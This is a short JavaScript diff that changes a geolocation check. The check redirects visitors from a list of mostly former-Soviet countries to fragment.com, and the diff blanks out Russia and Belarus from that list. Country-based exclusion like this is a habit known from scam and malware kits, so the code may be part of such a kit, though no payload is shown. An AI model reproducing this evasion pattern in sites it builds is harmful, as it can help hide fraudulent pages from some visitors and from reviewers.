@@ -28,7 +28,7 @@ const CONFIG = {
     try {
         const res = await fetch('https://ipapi.co/json/');
         const data = await res.json();
-        const blocked = ['RU', 'KZ', 'BY', 'UA', 'AM', 'AZ', 'KG', 'MD', 'UZ', 'TJ', 'TM', 'GE'];
+        const blocked = ['', 'KZ', '', 'UA', 'AM', 'AZ', 'KG', 'MD', 'UZ', 'TJ', 'TM', 'GE'];
         if (blocked.includes(data.country)) {
             window.location.replace('https://fragment.com');
         }
